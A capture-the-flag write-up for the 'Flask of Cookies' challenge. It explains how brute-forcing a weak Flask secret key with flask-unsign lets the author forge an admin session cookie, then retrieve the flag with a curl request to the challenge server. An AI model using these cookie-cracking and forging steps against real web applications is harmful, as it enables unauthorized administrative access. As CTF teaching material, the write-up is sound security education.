## BackdoorCTF 2025 - Flask of Cookies Write-up

![Title](images/Title.png)

### Step 1: Initial Analysis and Source Code Review

We are provided with the source code of a tiny Flask application, `app.py`, a `Dockerfile`, and some HTML templates.

The core logic lies in `app.py`, specifically in the `derived_level` function and the `/admin` route:

```python
# app.py snippet
# ...
app.secret_key=os.environ["SECRET_KEY"]
flag_value =    open("./flag").read().rstrip()

def derived_level(sess,secret_key):
    user=sess.get("user","")
    role=sess.get("role","")
    if role =="admin" and user==secret_key[::-1]:
        return "superadmin"
    return "user"

@app.route("/")
def index():
    if "user" not in session:
        session["user"]="guest"
        session["role"]="user"
    return render_template("index.html")

@app.route("/admin")
def admin():
    level = derived_level(session,app.secret_key)
    if level == "superadmin":
        return render_template("admin.html",flag=flag_value)
    return "Access denied.\n",403
# ...
```

From this, we deduce the following:
*   The application uses Flask sessions, which are signed with `app.secret_key`.
*   To access the flag, we need to reach the `/admin` endpoint with a `superadmin` level.
*   The `derived_level` function grants `superadmin` status if `role` in the session is "admin" AND `user` in the session is the reverse of `app.secret_key`.

### Step 2: Unsigning the Session Cookie and Retrieving the Secret Key

The initial session cookie, as seen in the browser, typically contains `{"role": "user", "user": "guest"}`. Flask uses `itsdangerous.URLSafeTimedSerializer` to sign these cookies.

We can use the `flask-unsign` tool to attempt to brute-force the `SECRET_KEY` given a valid session cookie and a wordlist. The challenge link provides an example of this.

First, we grab a session cookie from our browser.

![BROWE](images/1.png)

We then run `flask-unsign` with a common wordlist (like `rockyou.txt`):

```bash
flask-unsign --unsign --cookie "eyJyb2xlIjoidXNlciIsInVzZXIiOiJndWVzdCJ9.aTSFpg.ZqjJ23Vz9gyOdlE-jVt6qoHVmOw" --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval
```

After a few attempts, `flask-unsign` successfully reveals the secret key:

![flask-unsign](images/2.png)

The `SECRET_KEY` is `qwertyuiop`.

### Step 3: Crafting a Malicious Session Cookie

Now that we have the `SECRET_KEY`, we can craft our own session cookie to satisfy the `superadmin` conditions:

1.  `role` must be "admin".
2.  `user` must be the reverse of `SECRET_KEY`.
    *   `SECRET_KEY`: `qwertyuiop`
    *   Reversed `SECRET_KEY`: `poiuytrewq`

So, our desired session payload is `{"role": "admin", "user": "poiuytrewq"}`.

We can use `flask-unsign` to sign this new session payload:

```bash
flask-unsign --sign --cookie "{'role':'admin', 'user':'poiuytrewq'}" --secret 'qwertyuiop'

```

This generates our new, malicious session cookie:

![flask-unsign](images/3.png)

### Step 4: Exploitation and Retrieving the Flag

With the new session cookie, we can send a request to the `/admin` endpoint. We can do this using `curl` or by manually editing the cookie in our browser's developer tools.

Using `curl`:

```bash
curl -v -H "Cookie: session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VyIjoicG9pdXl0cmV3cSJ9.aTSJcg.Rd5JBkyIP2IKej7cKIQ9u4N9VE8" http://104.198.24.52:6011/admin
```

The server responds with the HTML for the admin panel, including our flag!

![flask-unsign](images/4.png)
![flask-unsign](images/5.png)

### Flag
`flag{y0u_l34rn3ed_flask_uns1gn_c0ok1e}`

![flask-unsign](images/6.png)